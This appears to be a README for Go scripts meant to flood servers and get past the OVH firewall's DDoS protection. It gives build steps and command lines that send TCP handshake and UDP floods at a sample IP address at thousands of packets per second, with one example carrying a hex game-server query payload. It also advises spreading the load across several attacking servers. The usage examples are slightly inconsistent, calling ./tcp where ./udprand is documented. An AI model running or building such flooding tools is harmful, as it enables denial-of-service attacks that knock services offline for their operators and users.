<h2>Golang OVH Bypasses</h2>

<h3>Coded by forky (tg: @yfork)</h3>

<h4>Those scripts are made to bypass OVH firewall</h4>


<h1>Installation:</h1>

```sh
apt install snap snapd -y
snap install go --classic
```

<h1>Setup:</h1>

<h3>Update servers.json</h3><br>

```json
go build tcp.go
go build udp.go
go build udprand.go
```

<h3>TCP Handshake usage</h3><br>

```json
./tcp <target> <tcp-port> <packets-per-second>
./tcp 145.239.54.169 80 10000
```

<h3>UDP with TCP Handshake and random data usage</h3><br>

```json
./udprand <target> <tcp-port> <udp-port> <packets-per-second>
./tcp 145.239.54.169 80 1194 8000
```

<h3>UDP with TCP Handshake and custom data usage</h3><br>

```json
./udprand <target> <tcp-port> <udp-port> <packets-per-second> <udp-payload>
./tcp 145.239.54.169 80 1194 8000 ffffffff54536f7572636520456e67696e6520517565727900
```

## We recommend using a low amount of PPS per server (10000 p/s max)
